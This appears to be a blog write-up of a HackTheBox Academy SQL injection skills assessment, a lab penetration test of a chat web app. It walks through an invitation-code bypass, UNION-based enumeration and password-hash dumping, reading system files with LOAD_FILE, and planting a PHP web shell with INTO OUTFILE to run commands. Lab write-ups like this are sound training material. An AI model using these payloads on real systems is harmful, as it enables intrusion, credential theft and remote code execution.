---
title: HackTheBox | Skills Assessment - SQL Injection
by: initialt
date: 2025-11-09 20:36:00 +0100
categories: [walk-trough, hackthebox, sql injection]
tags: [academy, sumace, hackthebox, walk-trough, sql injection]
image:
  path: /assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/banner.png
  alt: HackTheBox Skills Assessment - SQL Injection walk-trough
---

## task description

You have been contracted by chattr GmbH to conduct a penetration test of their web application. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform an assessment specifically focused on testing for SQL injection vulnerabilities on the web application from a "black box" approach.

## reconnaissance phase
At the start we have two pages available - login and register. Inspecting them, we can see there is some script that checks the username in the register page.
`POST /api/checkUsername.php`

![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/1.png)
_Register page_

It's a bad practice to show usernames that are also logins to the system to anyone, but that leads us no further for now; there is no SQL injection here.
When we enter a name that isn't already taken, we can send a register.php request

```
POST /api/register.php HTTP/1.1
... SNIP ...

username=admin1&password=Test1234*&repeatPassword=Test1234*&invitationCode=abcd-efgh-1234
```

we will receive an error in response to the `e` parameter `"e=invalid+invitation+code"`

![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/2.png)
_Error in the invitation_

## sql injection

Let's see how it will behave with a little SQLi.

```
POST /api/register.php
... SNIP ...

username=admin1&password=Test1234*&repeatPassword=Test1234*&invitationCode=abcd-efgh-1234' or '1'='1
```

And we have our first SQLi here, as in response we get redirection to login with success. `s=account+created+successfully!`

```
HTTP/1.1 302 Found
Server: nginx/1.22.1
Date: Sat, 08 Nov 2025 16:46:45 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Location: /login.php?s=account+created+successfully!
Content-Length: 0
```

Now we have an account in the portal, and we can send messages to other users, and what's important is we can retrieve sent messages back, which smells like UNION-based SQLi.

![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/4.png)
_Chat page after logging in_

Sending `GET /index.php?q=hey'&u=1` returns 500, which means we have something here.

![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/5.png)
_Internal server error when adding an apostrophe to the query_

Let's dig:

`https://94.237.49.128:52400/index.php?q=2%27)%20order%20by%202;--%20&u=1`

![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/6.png)
_Adding order by to the query to find out the numbers of columns_

Trying to enumerate the column count, we hit a 500 error on `q=2') order by 5;--`, so we can assume there are 4 columns.

`https://94.237.49.128:52400/index.php?q=2') union select 1,@@version,3,4;-- &u=1`

We get our responses from other users in chats 3 and 4; let's move our param there.
![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/7.png)
_Union based sql injection_

`https://94.237.49.128:52400/index.php?q=2') union select 1,2,@@version,4;-- &u=1` gives:

![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/8.png)
_Version of database_

We can now obtain the names of tables in the database.

`https://94.237.49.128:52400/index.php?q=2') UNION select 1,2,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES;-- &u=1`

And we can see the table Users and others. Let's select all columns from Users table:

`https://94.237.49.128:52400/index.php?q=2') UNION select 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users';-- &u=1`

![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/9.png)
_Columns in table users_

```
UserID
Username
Password
InvitationCode
AccountCreated
```

Now let's read our first flag

`https://94.237.49.128:52400/index.php?q=2') UNION select 1,2,Username,Password from Users;-- &u=1`

![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/10.png)
_Admin hash_

We have the admin password hash; let's exploit it further and try to install a shell on the host.

## shell

We can read files
`https://94.237.52.164:43007/index.php?q=2%27)%20UNION%20SELECT%201,%202,%20LOAD_FILE(%22/etc/passwd%22),%204;--%20&u=1`

Let's check site location
https://94.237.52.164:43007/index.php?q=2%27)%20UNION%20SELECT%201,%202,%20LOAD_FILE(%22/etc/nginx/sites-available/default%22),%204;--%20&u=1

![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/11.png)
_Site location_


`https://94.237.49.128:52400/index.php?q=2') UNION SELECT 1, 2, variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv";-- &u=1`

`SECURE_FILE_PRIV` is empty which is likely we can output to a file

let's try to save shell
`https://94.237.52.164:43007/index.php?q=2') union select "","",'<?php system($_REQUEST[0]); ?>', "" into outfile '/var/www/chattr-prod/shell.php';-- &u=1`

In return, we receive 500, but let's not be tempted and check if the server has saved the file after all:

yup, we are user `www-data`

![Desktop View](/assets/img/2025-11-09-HTB-SkillsAssessmentSQLInjection/12.png)
_Site location_

Let's go grab the flag file name
`https://94.237.52.164:43007/shell.php?0=ls%20/%20-la`

And finally the flag

`https://94.237.52.164:43007/shell.php?0=cat%20/flag_---SNIP---.txt`

